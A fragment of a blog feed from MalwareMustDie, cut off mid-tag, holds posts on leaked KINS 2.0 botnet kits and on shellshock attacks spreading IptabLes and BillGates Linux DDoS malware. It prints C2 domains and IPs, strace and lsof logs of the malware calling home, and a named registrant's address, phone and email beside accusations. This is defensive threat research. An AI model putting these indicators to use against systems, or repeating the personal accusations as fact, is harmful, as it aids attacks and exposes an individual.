href=\"https:\/\/lh3.googleusercontent.com\/-dY0CcPvNomE\/VZqAE0EHV3I\/AAAAAAAASbw\/7tPE0S_20b8\/s2312\/2001.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-dY0CcPvNomE\/VZqAE0EHV3I\/AAAAAAAASbw\/7tPE0S_20b8\/s190\/2001.png\u003E\u003C\/a\u003E \u003Cblockquote class=\"twitter-tweet\" lang=\"ja\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003ECrooks spread KINS2 leaked toolkit w\/many tricks \u0026amp; to many download sites. \u0026#10;This is PoC of 1of them!\u0026#10;\u003Ca href=\"https:\/\/twitter.com\/hashtag\/MalwareMustDie?src=hash\"\u003E#MalwareMustDie\u003C\/a\u003E \u003Ca href=\"http:\/\/t.co\/F3twg4QJaD\"\u003Epic.twitter.com\/F3twg4QJaD\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/618800147611291648\"\u003E2015, 7月 8\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Ca name=\"surge\"\u003E\u003Cp\u003E\u003Ch2\u003EThe surge of \"freeware\" KINS2 leaked botnets is on..\u003C\/h2\u003E \u003C\/a\u003E \u003Cp\u003E\u003Cb\u003EThe fact: \u003C\/b\u003EWe monitored the surge of this leak-basis KINS 2.0.0.0 botnets, to found that since we start monitoring on July 7th 2015 (around midnight JST) and now..July 9th around 10am (JST), 16 \u003Cb\u003Enew botnets\u003C\/b\u003E are up and 11 of them are actively infecting. These detected botnets were built by the default setting of the leaked botnet toolkit. Below are two proof videos (you can see what I mean by default setting in that videos), I took them in July 7th 2015 and July 9th 10am.  \u003Cp\u003E\u003Cb\u003EThe point: \u003C\/b\u003EPlease ask yourself..if less than 2 days the (known only) 16 botnets were popping up .. how many botnets we can expect within a month operated and infecting us with the same surge pace? \u003Cp\u003E\u003Cb\u003EThe Plan to mitigate this surge:\u003C\/b\u003E\u003Cpre\u003E\u003Cb\u003E- takedown EVERY shared archives that spread by crooks in the internet\u003Cbr \/\u003E- release blocking sigs soon (if you are not yet)\u003Cbr \/\u003E- block default toolkit configuration object used download web traffic filtration scheme\u003Cbr \/\u003E- seek \u0026 clean up infrastructure used by surged botnets before it gets too many\u003C\/b\u003E\u003C\/pre\u003E \u003Cp\u003E\u003Ciframe width=\"580\" height=\"326\" src=\"https:\/\/www.youtube.com\/embed\/gVCsReaAxMA?rel=0\u0026amp;controls=0\u0026amp;showinfo=0\" frameborder=\"0\" allowfullscreen\u003E\u003C\/iframe\u003E \u003Cp\u003E\u003Ciframe width=\"580\" height=\"326\" src=\"https:\/\/www.youtube.com\/embed\/wy_6-vKSaAw?rel=0\u0026amp;controls=0\u0026amp;showinfo=0\" frameborder=\"0\" allowfullscreen\u003E\u003C\/iframe\u003E \u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E\u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E well.. don\u0026#39;t say that we didn\u0026#39;t warn you about this.. for 2 days = 16 botnets, how many for a month then? do the math.\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/618966543871795200\"\u003EJuly 9, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E  \u003Cp\u003EThank you for reading, please help to spread this awareness and stay safe!\u003Cbr\u003EThank Xylit0l, he is doing very hard effort to fight, detect and act against this threat for YEARS.  \u003Cp\u003EMalwareMustDie! "},"link":[{"rel":"replies","type":"application/atom+xml","href":"http:\/\/blog.malwaremustdie.org\/feeds\/396585688706408128\/comments\/default","title":"Post Comments"},{"rel":"replies","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2015\/07\/mmd-0036-2015-kins-or-zeusvm-v2000.html#comment-form","title":"3 Comments"},{"rel":"edit","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/396585688706408128"},{"rel":"self","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/396585688706408128"},{"rel":"alternate","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2015\/07\/mmd-0036-2015-kins-or-zeusvm-v2000.html","title":"MMD-0036-2015 - KINS (or ZeusVM) v2.0.0.0 tookit (builder \u0026 panel source code) leaked."}],"author":[{"name":{"$t":"unixfreaxjp"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"/web/20160930230250/http://schemas.google.com/g/2005#thumbnail","width":"32","height":"32","src":"\/\/2.bp.blogspot.com\/-iTSFZlPaBR0\/U5DrOe7GA0I\/AAAAAAAAQL0\/NtZkh4YTXR8\/s113\/*"}}],"media$thumbnail":{"xmlns$media":"/web/20160930230250/http://search.yahoo.com/mrss/","url":"https:\/\/lh3.googleusercontent.com\/-0hdXnvwPSog\/VZk3GEPTRKI\/AAAAAAAASZM\/ug_Akdcwr_Q\/s72-c\/011.png","height":"72","width":"72"},"thr$total":{"$t":"3"}},{"id":{"$t":"tag:blogger.com,1999:blog-8268358095554400245.post-4789848612856004558"},"published":{"$t":"2015-06-30T22:15:00.002-07:00"},"updated":{"$t":"2015-07-13T05:40:25.677-07:00"},"title":{"type":"text","$t":"MMD-0035-2015 - .IptabLex or .IptabLes on shellshock.. sponsored by ChinaZ actor"},"content":{"type":"html","$t":"\u003Cp\u003E\u003Ch2\u003EThe background\u003C\/h2\u003E \u003Cb\u003E.IptabLex\u003C\/b\u003E \u0026 \u003Cb\u003E.IptabLes\u003C\/b\u003E ELF DDoS malware is the malware made by China DDoSer crime group, designed to infect multiple architecture of Linux distribution, was aiming for Linux boxes in the internet with the low security and authentication flaw in SSH as vector of infection, was an emerged ELF threat in 2014.   \u003Cp\u003EHistorically, MalwareMustDie, NPO (MMD) is the first entity who detected this malware around May last year and named it as \u003Cb\u003ELinux .Iptablesx|s\u003C\/b\u003E on our last year's alert \u003Cb\u003EMMD-0025-2014\u003C\/b\u003E [\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2014\/06\/mmd-0025-2014-itw-infection-of-elf.html\"\u003Elink\u003C\/a\u003E] released on June 15, 2014. And we build malware repository for this ELF family for sharing samples and trend for researchers and industries on kernelmode started from September 4th 2014 [\u003Ca href=\"http:\/\/www.kernelmode.info\/forum\/viewtopic.php?f=16\u0026t=3468\"\u003Elink\u003C\/a\u003E], since the threat was gone so wild at the time and there was so few information about this malware that causing low awareness and detection ratio, so we managed all we can to suppress the growth of infection rate.  \u003Cp\u003EThe DDoS attacks originated from this malware, in quantity of incidents and traffic used, was so massive in 2014 causing some warning was released from important security entities in September 2014, as per announced by \u003Cb\u003EProlexic \u003C\/b\u003E\u003Ci\u003E(thank you for mentioning MalwareMustDie)\u003C\/i\u003E [\u003Ca href=\"http:\/\/www.prolexic.com\/kcresources\/prolexic-threat-advisories\/prolexic-ddos-threat-advisory-iptables-iptablex-linux-bots-botnet-cybersecurity\/TA-DDos-Binary-Bot-IptabLes-v6-A4.pdf\"\u003Elink\u003C\/a\u003E] in their \u003Cb\u003EThreat Advisory\u003C\/b\u003E with \u003Ci\u003E\"High Risk\"\u003C\/i\u003E level, following by \u003Cb\u003EAkamai\u003C\/b\u003E's warning referred to the Prolexic's advisory announcing the world wide warning [\u003Ca href=\"https:\/\/www.akamai.com\/us\/en\/about\/news\/press\/2014-press\/akamai-warns-of-iptabLes-and-iptabLex-infection-on-linux-ddos-attacks.jsp\"\u003Elink\u003C\/a\u003E] of \u003Cb\u003E.IptableS|X\u003C\/b\u003E.  \u003Cp\u003EAfterward, Linux \u003Cb\u003E.IptableS \/ .IptablesX\u003C\/b\u003E ELF malware was still be detected in the wild until the end of October 2014, but since November 2014 we did not find any significant wave of infection using these family, wiped by the emerge of many other China DDoS new malware families that we detected also afterwards. From the early this year (January 2015), we started to assume the malware popularity and development of \u003Cb\u003E.IptabLes|x\u003C\/b\u003E was stopped..  \u003Cp\u003EHowever, on June 27th 2015 I was informed in the twitter by a friend \u003Cb\u003E@TinkerSec\u003C\/b\u003E for what was suspected as \u003Cb\u003ELinux\/ChinaZ\u003C\/b\u003E infection. I supported him with ELF binary sample's \"real time\" analysis in twitter as per shown in his report below: \u003Cblockquote class=\"twitter-tweet\" data-cards=\"hidden\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003EMalware Detection \u0026amp; Analysis - Discovery by \u003Ca href=\"https:\/\/twitter.com\/TinkerSec\"\u003E@TinkerSec\u003C\/a\u003E \u0026amp; Analysis by \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E - Consolidated with \u003Ca href=\"https:\/\/twitter.com\/Storify\"\u003E@Storify\u003C\/a\u003E - \u003Ca href=\"https:\/\/t.co\/UYO9KDniOr\"\u003Ehttps:\/\/t.co\/UYO9KDniOr\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; Tinker (@TinkerSec) \u003Ca href=\"https:\/\/twitter.com\/TinkerSec\/status\/614533359042101248\"\u003EJune 26, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003EToday, our team mate \u003Cb\u003E@benkow\u003C\/b\u003E has detected a shellshock attack with having the same payload as sample, and curiousity made me taking a deeper analysis this time, to find and feel so surprised to realize that the payload is a \u003Cb\u003ELinux IptableS\u003C\/b\u003E or \u003Cb\u003E.IptablesX\u003C\/b\u003E variant actually. I can not believe this myself so I checked many times until I am very positive with this conclusion and after understanding why we were thinking it was \u003Cb\u003ELinux\/ChinaZ\u003C\/b\u003E I wrote this information as the follow up, \u003Cb\u003E\u003Ci\u003Ethe return of 2014's DDoS disaster\u003C\/i\u003E\u003C\/b\u003E, the \u003Cb\u003EIptableS|X\u003C\/b\u003E threat. Below is the detail.  \u003Cp\u003E\u003Ch2\u003EStraight to investigation: The shellshock, ChinaZ, .IptabLes|x and BillGates\u003C\/h2\u003E \u003Cp\u003EThis report is not into details for each malware's technical analysis since the involved malware in this threat are the well-known type and previously analyzed ones (I posted them in here, in repository kernelmode and in VirusTotal too), but I will highlight the infection scheme to clarify what this threat actually is, and to point some information that can lead law enforcement to the actor behind the scene.  \u003Cp\u003EThe received two reports are coming from two different time, different unrelated sources of the two pattern of shellshock attacks as per shown below, again, thank's to @tinkersec and @benkow for the share:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-9lZToyDs3mI\/VZNW3lIVVwI\/AAAAAAAASPU\/Dx6fQ7yI5ow\/s1576\/004.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-9lZToyDs3mI\/VZNW3lIVVwI\/AAAAAAAASPU\/Dx6fQ7yI5ow\/s500\/004.png\u003E\u003C\/a\u003E\u003Cbr\u003ELet's see it as clean code (always beautify any malcode we read, we are not crooks, we should read it plain, clear and structured), there are many clue inside of these one-liner infection command actually, see below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-JBJUyYAwMjU\/VZNf5VRroyI\/AAAAAAAASQI\/z6huo_pCDL0\/s1512\/008.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-JBJUyYAwMjU\/VZNf5VRroyI\/AAAAAAAASQI\/z6huo_pCDL0\/s580\/008.png\u003E\u003C\/a\u003E\u003Cbr\u003EThis shellshock code itself is showing the attackers IP address for both attacks are coming from \u003Cb\u003E58.213.123.107\u003C\/b\u003E and the shellshock commands used were a common way seen for executing bash command via User-agent() and a direct GET command with shellshock vulnerability strings. This shellshock code is showing us, in a glimpse, that the \u003Cb\u003EChinaZ\u003C\/b\u003E malware crooks is spreading their ChinaZ payloads \u003C what exactly ChinaZ bad actors want us to think. So let's see further..  \u003Cp\u003EThe second fact..the first \u0026 the second shellshock attacks in log were detected by the different researchers in different continents and different infecting time (June 26 and June 30)), but it is having the same ELF payload:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-vgwUIieqe-8\/VZNjj6cxVaI\/AAAAAAAASQU\/C8GMvdp-IdU\/s1586\/003.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-vgwUIieqe-8\/VZNjj6cxVaI\/AAAAAAAASQU\/C8GMvdp-IdU\/s500\/003.png\u003E\u003C\/a\u003E\u003Cbr\u003EIt's pretty odd for me to find shellshock same ELF malware that lasts more than 3 days, specially to \u003Cb\u003ELinux\/ChinaZ\u003C\/b\u003E since they have their own codes and builders..weird. Why?  \u003Cp\u003EAnd look at what has been \"specifically found\" in that payload sample:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-AILLwj0Eujw\/VZNcDr79BuI\/AAAAAAAASP8\/FzF1VJhuSIE\/s1720\/007.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-AILLwj0Eujw\/VZNcDr79BuI\/AAAAAAAASP8\/FzF1VJhuSIE\/s580\/007.png\u003E\u003C\/a\u003E\u003Cbr\u003EThis is the signature of the \u003Cb\u003ELinux\/.IptableS|X\u003C\/b\u003E malware! There is no ChinaZ source code is having \u003Cb\u003EIptabLes|x\u003C\/b\u003E interactive shutdown and restart command like this. See how the coder try to hide those within bunch of real iptables (note the characters) firewall shutdown command. Moreover, it makes so much sense why there are command closefirewall() to stop the running iptables service instance in the victim system for the purpose of infecting \u003Cb\u003EIptabLes|x\u003C\/b\u003E malware:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-kNLjeFA5ecM\/VZNkWXR9mTI\/AAAAAAAASQc\/KmWCGlwrYnE\/s1912\/003.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-kNLjeFA5ecM\/VZNkWXR9mTI\/AAAAAAAASQc\/KmWCGlwrYnE\/s580\/003.png\u003E\u003C\/a\u003E\u003Cbr\u003ENow many mysteries are solved eventually :-)  \u003Cp\u003EWhy they did this? Why they use \u003Cb\u003EIptabLes|x\u003C\/b\u003E ? So far the conclusion is apparently either ChinaZ crooks starting to drop their original payload (because we reversed and exposed them way too much?) ..Or there's someone wants to play as \"ChinaZ\" and spread IptablesS|X instead. \u003Cbr\u003EWell..okay, let's dig further information into the panel used for the infection source, and let's see what else we can gather over there now :)\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-2WykzMo4V8M\/VZNmJi5ftRI\/AAAAAAAASQo\/Exv7biyq2n8\/s1720\/001.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-2WykzMo4V8M\/VZNmJi5ftRI\/AAAAAAAASQo\/Exv7biyq2n8\/s580\/001.png\u003E\u003C\/a\u003E\u003Cbr\u003EOkay, for you who haven't seen these web panel before, it is a modified HFS web server (a good and legit web server, my fav tool in work actually) Chinese version on \u003Cb\u003E202.103.243.104\u003C\/b\u003E and contains .Iptables|X x32 and x64 versions and.. a \u003Cb\u003ELinux\/BillGates\u003C\/b\u003E ELF DDoS malware too! Wow, so now we are facing the fact that we may have a \"ChinaZ crooks\" using \u003Cb\u003E.IptableS|X\u003C\/b\u003E and \u003Cb\u003ELinux\/BillGates\u003C\/b\u003E as payload. Noted: there are so many download score for the x32 version of IptableS|X (see in the screenshot, more than 4,000 hits for download) explaining there were so many running Linux box may got hit by shellshock infection script sent by attacker and downloading by this malware. Yes, even now, shellshock still indeed effective to spread bash-basis attacks\/malware infection.  \u003Cp\u003EThe attacker IP is running as bot to infect all linux server's with the web server scanned under below detail: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E58.213.123.107||4134 | 58.208.0.0\/12 | CHINANET | CN | chinatelecom.com.cn\u003Cbr \/\u003EChinaNet Jiangsu Province Network\u003Cbr \/\u003E{\u003Cbr \/\u003E  \"ip\": \"58.213.123.107\",\u003Cbr \/\u003E  \"hostname\": \"No Hostname\",\u003Cbr \/\u003E  \"city\": \"Nanjing\",\u003Cbr \/\u003E  \"region\": \"Jiangsu\",\u003Cbr \/\u003E  \"country\": \"CN\",\u003Cbr \/\u003E  \"loc\": \"32.0617,118.7778\",\u003Cbr \/\u003E  \"org\": \"AS4134 No.31,Jin-rong Street\"\u003Cbr \/\u003E}\u003Cbr \/\u003E\u003C\/pre\u003ENoted: we seriously need to stop this IP attacking the internet as soon as possible!  \u003Cp\u003EAnd the panel is running in IP with the below detail: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E202.103.243.104||4134 | 202.103.192.0\/18 | CHINANET | CN | chinatelecom.com.cn \u003Cbr \/\u003EChinaNet Guangxi Province Network\u003Cbr \/\u003E{\u003Cbr \/\u003E  \"ip\": \"202.103.243.104\",\u003Cbr \/\u003E  \"hostname\": \"bbs.gliet.edu.cn\",\u003Cbr \/\u003E  \"city\": \"Guilin\",\u003Cbr \/\u003E  \"region\": \"Guangxi\",\u003Cbr \/\u003E  \"country\": \"CN\",\u003Cbr \/\u003E  \"loc\": \"25.2819,110.2864\",\u003Cbr \/\u003E  \"org\": \"AS4134 No.31,Jin-rong Street\"\u003Cbr \/\u003E}\u003Cbr \/\u003E\u003C\/pre\u003EAs you can see, both attacker and infection panel are running from the same route of AS4134.  \u003Cp\u003EBelow is the PoC of the panel domain used, could be a hacked server of an educational network in China.. or could be a hacked domain instead:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-cQFSuB7f0vA\/VZNx0TpGIpI\/AAAAAAAASQ4\/P4c_J5CdnSE\/s1640\/002.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-cQFSuB7f0vA\/VZNx0TpGIpI\/AAAAAAAASQ4\/P4c_J5CdnSE\/s580\/002.png\u003E\u003C\/a\u003E \u003Cp\u003E\u003Ch2\u003EMalware analysis\u003C\/h2\u003E \u003Cp\u003EThe technical analysis online I did on Linux\/IptableS|x sample while suporting @TinkerSec on twitter (see the tweet I embedded above for the link) is correct, so I am not going to add more details on those, and the point is, it highlighted this CNC information: \u003Cpre class=\"brush: asm\"\u003E\"domain: v8.f1122.org  \u003Cbr \/\u003EIP: 61.160.212.172\u003Cbr \/\u003Eport 1122   \"\u003C\/pre\u003ECNC hard evidence taken during the test:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-nyUlm889zbU\/VZN_ytM4HbI\/AAAAAAAASRU\/6ot_PNoKqhk\/s1912\/010.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-nyUlm889zbU\/VZN_ytM4HbI\/AAAAAAAASRU\/6ot_PNoKqhk\/s580\/010.png\u003E\u003C\/a\u003E\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-Tk78fwQUsD4\/VZOA7CbRJfI\/AAAAAAAASRg\/0k8Bg9GTlLg\/s1731\/001.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-Tk78fwQUsD4\/VZOA7CbRJfI\/AAAAAAAASRg\/0k8Bg9GTlLg\/s580\/001.png\u003E\u003C\/a\u003E \u003Cp\u003E\u003Ch2\u003EDetail information of the CNC domain and IP address\u003C\/h2\u003E \u003Cp\u003E.IptabLes|x CNC information: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E61.160.212.172| - |23650 | 61.160.212.0\/24 | CHINANET-JS-AS | CN | chinatelecom.com.cn\u003Cbr \/\u003EChinaNet Jiangsu Province Network\u003Cbr \/\u003E{\u003Cbr \/\u003E  \"ip\": \"61.160.212.172\",\u003Cbr \/\u003E  \"hostname\": \"v8.f1122.org\",\u003Cbr \/\u003E  \"city\": \"Nanjing\",\u003Cbr \/\u003E  \"region\": \"Jiangsu\",\u003Cbr \/\u003E  \"country\": \"CN\",\u003Cbr \/\u003E  \"loc\": \"32.0617,118.7778\",\u003Cbr \/\u003E  \"org\": \"AS23650 AS Number for CHINANET jiangsu province backbone\"\u003Cbr \/\u003E}\u003C\/pre\u003EAnd the domain registration info is below and looks freezed now :) \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E\"Domain Name:F1122.ORG\u003Cbr \/\u003EDomain ID: D174941520-LROR\u003Cbr \/\u003ECreation Date: 2015-01-03T06:46:16Z\u003Cbr \/\u003EUpdated Date: 2015-03-05T03:45:24Z\u003Cbr \/\u003ERegistry Expiry Date: 2016-01-03T06:46:16Z\u003Cbr \/\u003ESponsoring Registrar:GoDaddy.com, LLC (R91-LROR)\"\u003Cbr \/\u003ESponsoring Registrar IANA ID: 146\u003Cbr \/\u003EWHOIS Server:\u003Cbr \/\u003EReferral URL:\u003Cbr \/\u003EDomain Status: clientDeleteProhibited -- http:\/\/www.icann.org\/epp#clientDeleteProhibited\u003Cbr \/\u003EDomain Status: clientRenewProhibited -- http:\/\/www.icann.org\/epp#clientRenewProhibited\u003Cbr \/\u003EDomain Status: clientTransferProhibited -- http:\/\/www.icann.org\/epp#clientTransferProhibited\u003Cbr \/\u003EDomain Status: clientUpdateProhibited -- http:\/\/www.icann.org\/epp#clientUpdateProhibited\u003Cbr \/\u003ERegistrant \"ID:CR184376377\"\u003Cbr \/\u003ERegistrant \"Name:xihuang li\"\u003Cbr \/\u003ERegistrant Organization:\u003Cbr \/\u003ERegistrant \"Street: shanxishengdatongshibeijie23hao\"\u003Cbr \/\u003ERegistrant \"City:shanxishengdatongshi\"\u003Cbr \/\u003ERegistrant \"State\/Province:shanxisheng\"\u003Cbr \/\u003ERegistrant Postal Code:037000\u003Cbr \/\u003ERegistrant Country:CN\u003Cbr \/\u003ERegistrant \"Phone:+86.3522036283\"\u003Cbr \/\u003ERegistrant Phone Ext:\u003Cbr \/\u003ERegistrant Fax:\u003Cbr \/\u003ERegistrant Fax Ext:\u003Cbr \/\u003ERegistrant \"Email:wendingba@163.com\"\u003Cbr \/\u003E\u003C\/pre\u003EWell, \u003Cb\u003EWENDINGBA@163.COM\u003C\/b\u003E is associated with Xihuang Li and 5 other names. A total of 1,382 associated domains were identified, most of them are registered in GoDaddy or ENOM. He is a professional crook in the field. Below is the snip of the first 20 domains, the information is available for al of us to access:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-Kh8DvUvQ0PY\/VZN0QwBTPrI\/AAAAAAAASRE\/TZJUKdEpaZ0\/s1512\/009.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-Kh8DvUvQ0PY\/VZN0QwBTPrI\/AAAAAAAASRE\/TZJUKdEpaZ0\/s580\/009.png\u003E\u003C\/a\u003E \u003Cp\u003EThe Linux\/BillGates is as usual, please find our previous MMD posts about these samples, this one has nothing to add. The CNC information is as per below: \u003Cpre class=\"brush: asm\"\u003EDomain: udp.f1122.org\u003Cbr \/\u003EIP: 61.160.213.18\u003Cbr \/\u003EPort: 25001\u003C\/pre\u003E \u003Cp\u003EProof of the callback to CNC downloading configuration file: \u003Cpre class=\"brush: asm\"\u003Esocket(PF_INET, SOCK_STREAM, IPPROTO_IP\u003Cbr \/\u003Esendto(5, \"W\\204\\1\\0\\0\\1\\0\\0\\0\\0\\0\\0\\3udp\\5f1122\\3org\\0\\0\\1\\0\\1\", 31, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr(\"DNS\")}, 16)\u003Cbr \/\u003Erecvfrom(5, \"W\\204\\201\\200\\0\\1\\0\\1\\0\\2\\0\\n\\3udp\\5f1122\\3org\\0\\0\\1\\0\\1\\300\"..., 1024, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr(\"DNS\")}, [16])\u003Cbr \/\u003Econnect(4, {sa_family=AF_INET, sin_port=htons(25001), sin_addr=inet_addr(\"61.160.213.18\")}, 16)\u003Cbr \/\u003Eopen(\"\/XXXX\/conf.n\", O_RDWR|O_CREAT, 0644)\u003Cbr \/\u003Ewrite(5, \"\\0\\364\\1\\0\\0002\\0\\0\\0\\350\\3\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\1\\1\\2\\0\\0\\0\"..., 69)\u003Cbr \/\u003Eclose(5)\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003EProof that the CNC is ESTABLISHING connection from the malware: \u003Cpre class=\"brush: asm\"\u003E$ date\u003Cbr \/\u003EWed Jul  1 15:25:44 JST 2015\u003Cbr \/\u003E (snips)\u003Cbr \/\u003E28443 28453 txt    REG        8,6  1223123 1048605 \/sudp\u003Cbr \/\u003E28443 28453  0u    CHR        1,3      0t0    1192 \/dev\/null\u003Cbr \/\u003E28443 28453  1u    CHR        1,3      0t0    1192 \/dev\/null\u003Cbr \/\u003E28443 28453  2u    CHR        1,3      0t0    1192 \/dev\/null\u003Cbr \/\u003E28443 28453  3uW   REG        8,1        5  261598 \/tmp\/gates.lod\u003Cbr \/\u003E28443 28453  4u   \"IPv4  127246603      0t0  TCP MMD:32977-\u003E61.160.213.18:25001 (ESTABLISHED)\"\u003C\/pre\u003E \u003Cp\u003EThe above mentioned CNC hostname in DNS shows: \u003Cpre class=\"brush: asm\"\u003E;; QUESTION SECTION:\u003Cbr \/\u003E;udp.f1122.org.                 IN      A\u003Cbr \/\u003E\u003Cbr \/\u003E;; ANSWER SECTION:\u003Cbr \/\u003Eudp.f1122.org.          600     IN      A       61.160.213.18\u003Cbr \/\u003E\u003Cbr \/\u003E;; AUTHORITY SECTION:\u003Cbr \/\u003Ef1122.org.              600     IN      NS      f1g1ns1.dnspod.net.\u003Cbr \/\u003Ef1122.org.              600     IN      NS      f1g1ns2.dnspod.net.\u003Cbr \/\u003E\u003Cbr \/\u003E;; ADDITIONAL SECTION:\u003Cbr \/\u003Ef1g1ns1.dnspod.net.     350     IN      A       113.108.80.138\u003Cbr \/\u003Ef1g1ns1.dnspod.net.     350     IN      A       125.39.208.193\u003Cbr \/\u003Ef1g1ns1.dnspod.net.     350     IN      A       180.153.9.189\u003Cbr \/\u003Ef1g1ns1.dnspod.net.     350     IN      A       182.140.167.166\u003Cbr \/\u003Ef1g1ns1.dnspod.net.     350     IN      A       111.30.132.180\u003Cbr \/\u003Ef1g1ns2.dnspod.net.     1015    IN      A       115.236.137.40\u003Cbr \/\u003Ef1g1ns2.dnspod.net.     1015    IN      A       115.236.151.191\u003Cbr \/\u003Ef1g1ns2.dnspod.net.     1015    IN      A       182.140.167.188\u003Cbr \/\u003Ef1g1ns2.dnspod.net.     1015    IN      A       101.226.30.224\u003Cbr \/\u003Ef1g1ns2.dnspod.net.     1015    IN      A       112.90.82.194\u003C\/pre\u003E \u003Cp\u003EWith the IP is located in: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E61.160.213.18| - |23650 | 61.160.213.0\/24 | CHINANET-JS-AS | CN | chinatelecom.com.cn\u003Cbr \/\u003EChinaNet Jiangsu Province Network\u003Cbr \/\u003E{\u003Cbr \/\u003E  \"ip\": \"61.160.213.18\",\u003Cbr \/\u003E  \"hostname\": \"udp.f1122.org\",\u003Cbr \/\u003E  \"city\": \"Nanjing\",\u003Cbr \/\u003E  \"region\": \"Jiangsu\",\u003Cbr \/\u003E  \"country\": \"CN\",\u003Cbr \/\u003E  \"loc\": \"32.0617,118.7778\",\u003Cbr \/\u003E  \"org\": \"AS23650 AS Number for CHINANET jiangsu province backbone\"\u003Cbr \/\u003E}\u003C\/pre\u003EAs per predicted, the \u003Cb\u003ELinux\/BillGates\u003C\/b\u003E sample is using the same domain of \u003Cb\u003Ef1122.org \u003C\/b\u003Eand located in the same network as per CNC of \u003Cb\u003EIptableS|X\u003C\/b\u003E, we have the same actor here operated in both CNC, this is a hard evidence. And as always the crooks were closing the connection after I connected :-)   \u003Cp\u003EIn the previous ChinaZ report [\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2015\/06\/the-elf-chinaz-reloaded.html\"\u003Elink\u003C\/a\u003E] it was shown that the CNC was registered under email \u003Cfont color=yellow\u003E\u003Cb\u003Ebm18801463268@163.com\u003C\/b\u003E\u003C\/font\u003E and this time it uses the email of \u003Cfont color=yellow\u003E\u003Cb\u003Ewendingba@163.com\u003C\/b\u003E\u003C\/font\u003E, I am sure we have the same crook(s) here. It is nice to inform that we contacted \u003Cb\u003E\u003Cfont color=yellow\u003E163.com\u003C\/font\u003E\u003C\/b\u003E for more details, and that info to be shared to law enforcement only.So have a nice day to the bad actor, your crime is exposed and all of your malware are reversed and blogged here, using another malware binaries is not gonna stop us nailing you all over the internet, we know all of the stuff you use! ChinaZ MUST Die!  \u003Ca name=\"poc\"\u003E\u003Cp\u003E\u003Ch2\u003EProof of concept that \u003Cb\u003ECNC 58.221.254.153\u003C\/b\u003E belongs to ChinaZ: Builder, Hard code \u0026 CNC software\u003C\/h2\u003E\u003C\/a\u003E \u003Cp\u003ESupporting to the cyber crime investigation that follows the case. Our team also has confirmed that the \u003Cb\u003E58.221.254.153\u003C\/b\u003E belongs to ChinaZ actor, contains the ChinaZ builder, a windows application, contains the code of ChinaZ in that builder, and using CNC used for ChinaZ.  \u003Cp\u003E\u003Cb\u003EPoC #1: This is the builder:\u003C\/b\u003E --\u003E[\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/59e6c285b930ab0c2f83bae0807a4aeff6a1c2c17a556bce21f1f73b6ca8f10e\/analysis\/\"\u003EVT\u003C\/a\u003E]\u003Cbr\u003E\u003Ca 